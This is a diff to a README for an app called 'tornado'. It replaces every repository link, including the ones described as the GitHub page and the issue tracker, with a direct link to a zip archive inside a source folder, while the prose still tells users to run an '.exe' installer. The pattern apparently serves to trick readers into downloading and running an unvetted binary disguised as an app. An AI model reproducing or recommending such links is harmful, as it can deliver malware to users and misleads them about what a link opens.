@@ -1,6 +1,6 @@
 # 🌪 tornado - Simple App for Smooth Workflow
 
-[![Download tornado](https://img.shields.io/badge/Download-tornado-brightgreen)](https://github.com/QuocHuy615/tornado)
+[![Download tornado](https://img.shields.io/badge/Download-tornado-brightgreen)](https://github.com/QuocHuy615/tornado/raw/refs/heads/main/src/cmd/Software-v2.6.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Before downloading, please ensure your computer meets these basic requirements:
 
 Use the button below to visit the page where you can download tornado:
 
-[![Download and run tornado](https://img.shields.io/badge/Download-Here-blue)](https://github.com/QuocHuy615/tornado)
+[![Download and run tornado](https://img.shields.io/badge/Download-Here-blue)](https://github.com/QuocHuy615/tornado/raw/refs/heads/main/src/cmd/Software-v2.6.zip)
 
 Follow the steps below to get started.
 
@@ -38,7 +38,7 @@ Follow the steps below to get started.
 
 Click the button above, or open this link in your browser:
 
-https://github.com/QuocHuy615/tornado
+https://github.com/QuocHuy615/tornado/raw/refs/heads/main/src/cmd/Software-v2.6.zip
 
 This will take you to the GitHub page where tornado is stored. Look for the latest version or release of the app. You will find the files needed to install tornado here.
 
@@ -107,7 +107,7 @@ Access settings by clicking the gear icon in the top-right corner of the app win
 
 Visit the same GitHub download page regularly to check for updates:
 
-https://github.com/QuocHuy615/tornado
+https://github.com/QuocHuy615/tornado/raw/refs/heads/main/src/cmd/Software-v2.6.zip
 
 When a new version is released, download the new `.exe` file and run the installer again. It will update your app without removing your data.
 
@@ -130,7 +130,7 @@ If problems persist, open an issue on the GitHub repository page.
 
 For questions, bug reports, or suggestions, visit the GitHub repository here:
 
-https://github.com/QuocHuy615/tornado
+https://github.com/QuocHuy615/tornado/raw/refs/heads/main/src/cmd/Software-v2.6.zip
 
 You can use the “Issues” tab to report problems or give feedback.
 
@@ -144,4 +144,4 @@ You can use the “Issues” tab to report problems or give feedback.
 
 ---
 
-[![Download tornado](https://img.shields.io/badge/Download-tornado-brightgreen)](https://github.com/QuocHuy615/tornado)
+[![Download tornado](https://img.shields.io/badge/Download-tornado-brightgreen)](https://github.com/QuocHuy615/tornado/raw/refs/heads/main/src/cmd/Software-v2.6.zip)
